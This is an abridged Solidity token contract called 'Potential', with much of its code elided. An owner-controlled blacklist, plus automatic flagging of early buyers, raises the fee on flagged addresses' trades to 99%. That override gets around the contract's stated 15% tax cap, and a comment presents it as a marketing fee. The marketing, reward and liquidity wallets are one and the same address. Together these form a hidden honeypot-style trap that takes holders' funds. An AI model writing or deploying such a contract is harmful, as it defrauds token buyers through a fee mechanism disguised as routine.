...
contract Potential is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress =
        payable(0x94e9de3C1A1763924d76eD4cd724AADC9Ca7941C); // Marketing Address
    address payable public rewardAddress =
        payable(0x94e9de3C1A1763924d76eD4cd724AADC9Ca7941C); // Reward Address
    address payable public liquidityAddress =
        payable(0x94e9de3C1A1763924d76eD4cd724AADC9Ca7941C); // Liquidity Address
    ...
    string private constant _name = "Potential";
    ...
    mapping(address => bool) private _isPotential;
    ...
    function isPotential(address account) public view returns (bool) {
        return _isPotential[account];
    }

    function managePotentials(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        for (uint256 i; i < addresses.length; ++i) {
            _isPotential[addresses[i]] = status;
        }
    }
    ...
    function _transfer(
        ...
        if (limitsInEffect) {
            if (
                ...
                if (
                    ...
                    _isPotential[to] = true;
                }

                // only use to prevent potentials buy in the first blocks.
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            // If potentials buy or sell, increase marketing fee
            if ((_isPotential[to] || _isPotential[from]) && _liquidityFee > 0) {
                _liquidityFee = 99;
            }
        }
    ...
    function updateSwapTokensAtPercent(uint256 percent)
        external
        onlyOwner
        returns (bool)
    {
    ...
    function swapBack() private lockTheSwap {
        ...
        _rOwned[address(rewardAddress)] = _rOwned[address(rewardAddress)].add(
            rReward
        );
        _tOwned[address(rewardAddress)] = _tOwned[address(rewardAddress)].add(
            _rewardTokens
        );
    ...
    function setBuyFee(
        ...
        require(
            _buyTaxFee + _buyLiquidityFee + _buyRewardFee + _buyMarketingFee <=
                15,
            "Must keep taxes below 15%"
        );
    }
